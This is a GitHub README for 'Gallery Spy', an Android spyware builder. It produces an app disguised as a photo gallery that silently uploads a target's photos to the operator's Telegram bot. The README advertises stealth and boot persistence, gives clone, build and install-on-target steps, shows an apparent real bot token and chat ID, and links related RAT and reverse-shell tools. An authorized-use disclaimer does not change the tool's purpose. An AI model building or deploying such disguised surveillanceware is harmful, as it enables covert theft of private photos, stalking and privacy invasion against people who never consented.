# 📸 Gallery Spy - Telegram Photo Exfiltration Tool

<div align="center">

![Version](https://img.shields.io/badge/version-1.0-blue.svg)
![Android](https://img.shields.io/badge/Android-5.0%20to%2016-green.svg)
![Python](https://img.shields.io/badge/Python-3.8%2B-yellow.svg)
![License](https://img.shields.io/badge/license-Educational-red.svg)

**Professional Photo Surveillance Tool for Red Team Operations**

*Developed by [NIGHTKING](https://github.com/offsecnight)*

[Features](#-features) • [Installation](#-installation) • [Usage](#-usage) • [Disclaimer](#-disclaimer)

</div>

---

## 📋 Overview

Gallery Spy is a sophisticated Android surveillance tool that automatically exfiltrates photos from target devices to your Telegram bot. Disguised as a legitimate gallery app, it silently monitors and uploads photos in the background.

### 🎯 Key Capabilities

- **Automatic Photo Upload**: Monitors device storage and uploads new photos to Telegram
- **Stealth Operation**: Runs as a background service with minimal detection
- **Telegram Integration**: Direct photo delivery to your Telegram bot
- **Persistent Service**: Survives device reboots and app closures
- **Gallery UI**: Functional gallery interface for legitimacy
- **Wide Compatibility**: Supports Android 5.0 (Lollipop) to Android 16

---

## ✨ Features

### Core Functionality
- 📤 **Auto-Upload**: Automatically uploads photos to Telegram bot
- 🔄 **Background Service**: Persistent foreground service for reliability
- 🚀 **Boot Persistence**: Auto-starts on device boot
- 📱 **Network Monitoring**: Adapts to network changes
- 🎨 **Gallery Interface**: Fully functional photo gallery UI
- 🔐 **Permission Management**: Handles storage permissions gracefully

### Technical Features
- ✅ Android 5.0 - 16 (API 21-36) support
- ✅ Foreground service with notification
- ✅ WorkManager for reliable background tasks
- ✅ Room database for photo tracking
- ✅ OkHttp for efficient uploads
- ✅ Kotlin coroutines for async operations

---

## 🚀 Installation

### Prerequisites

- **Python 3.8+**
- **Java JDK 8+** (for APK signing)
- **Android Device** (API 21-36)
- **Telegram Bot** ([Create one](https://t.me/BotFather))

### Setup

1. **Clone Repository**
```bash
git clone https://github.com/offsecnight/Gallery-Spy.git
cd Gallery-Spy
```

2. **Install Dependencies**
```bash
# Python dependencies (if any)
pip install -r requirements.txt
```

3. **Get Telegram Credentials**
- Create a bot via [@BotFather](https://t.me/BotFather)
- Get your bot token (format: `123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11`)
- Get your chat ID (use [@userinfobot](https://t.me/userinfobot))

---

## 📱 Usage

### Building APK

Run the builder script:

```bash
python build.py
```

The builder will prompt you for:
- **Telegram Bot Token**: Your bot's API token
- **Telegram Chat ID**: Your Telegram user/chat ID

### Configuration Example

```
[?] Telegram Bot Token: 8504649470:AAESYyNP6QHNh7V4ioQ6tKP_mypYIvQ9WBs
[?] Telegram Chat ID: 8123598428
```

### Deployment

1. **Install APK** on target device
2. **Grant Permissions**:
   - Storage access (required)
   - Notification permission (optional)
3. **Launch App** once to initialize
4. **Photos Auto-Upload** to your Telegram bot

### Receiving Photos

Photos will be sent to your Telegram bot automatically:
- New photos detected in device storage
- Uploaded with original filename
- Sent as Telegram photo messages

---

## 🛠️ Builder Options

The `build.py` script provides:

- ✅ Automatic apktool download
- ✅ Keystore management (auto-create if missing)
- ✅ Telegram configuration injection
- ✅ APK signing (apksigner/jarsigner)
- ✅ Output APK in `output/` folder

### Keystore Details

- **Password**: `12345678`
- **Alias**: `key0`
- **Location**: `keystore/keystore`

---

## 📂 Project Structure

```
Gallery-Spy/
├── build.py              # APK builder script
├── stub/                 # Decompiled APK base
│   ├── smali/           # Smali source code
│   │   └── com/photo/gallery/
│   │       ├── TelegramConfig.smali    # Telegram credentials
│   │       ├── PhotoUploadService.smali # Upload service
│   │       └── MainActivity.smali       # Gallery UI
│   ├── res/             # Android resources
│   └── AndroidManifest.xml
├── keystore/            # APK signing keystore
├── output/              # Built APKs
└── README.md
```

---

## 🔧 Customization

### Modify Upload Behavior

Edit `stub/smali/com/photo/gallery/PhotoUploadService.smali`:
- Change upload frequency
- Filter photo types
- Modify notification behavior

### Change App Appearance

Edit resources in `stub/res/`:
- `values/strings.xml` - App name and text
- `mipmap-*/` - App icons
- `layout/` - UI layouts

---

## 🎯 Use Cases

### Red Team Operations
- Physical access assessments
- Social engineering campaigns
- Data exfiltration testing

### Security Research
- Android surveillance analysis
- Permission abuse research
- Background service persistence

### Penetration Testing
- Mobile device compromise
- Data leakage testing
- Stealth operation validation

---

## ⚠️ Disclaimer

**FOR AUTHORIZED SECURITY TESTING ONLY**

This tool is designed for:
- ✅ Authorized penetration testing
- ✅ Security research with consent
- ✅ Educational purposes
- ✅ Red team exercises with permission

**ILLEGAL USES:**
- ❌ Unauthorized surveillance
- ❌ Privacy invasion
- ❌ Stalking or harassment
- ❌ Any non-consensual monitoring

### Legal Notice

- Unauthorized access to devices is **ILLEGAL**
- Always obtain **written permission** before testing
- Comply with local laws and regulations
- The developer assumes **NO responsibility** for misuse
- Users are **solely responsible** for their actions

---

## 🤝 Contributing

Contributions are welcome! Please:

1. Fork the repository
2. Create a feature branch
3. Commit your changes
4. Push to the branch
5. Open a Pull Request

See [CONTRIBUTING.md](CONTRIBUTING.md) for details.

---

## 📄 License

This project is licensed under the **Educational Use License 2026**.

See [LICENSE](LICENSE) file for details.

---

## 👤 Author

**NIGHTKING**
- GitHub: [@offsecnight](https://github.com/offsecnight)
- Project: [Gallery Spy](https://github.com/offsecnight/Gallery-Spy)

---

## 🔗 Related Projects

- [DexSploitX](https://github.com/offsecnight/DexSploitX) - Ultimate Android RAT
- [Android-13-reverse-shell](https://github.com/offsecnight/Android-13-reverse-shell) - Reverse shell for Android
- [Advance-Camera-Hack-Tool](https://github.com/offsecnight/Advance-Camera-Hack-Tool) - Web camera exploitation

---

## 📞 Support

For issues and questions:
- Open an [Issue](https://github.com/offsecnight/Gallery-Spy/issues)
- Check existing issues first
- Provide detailed information

---

<div align="center">

**⚡ Built for Red Teamers, by Red Teamers ⚡**

*Remember: With great power comes great responsibility*

</div>
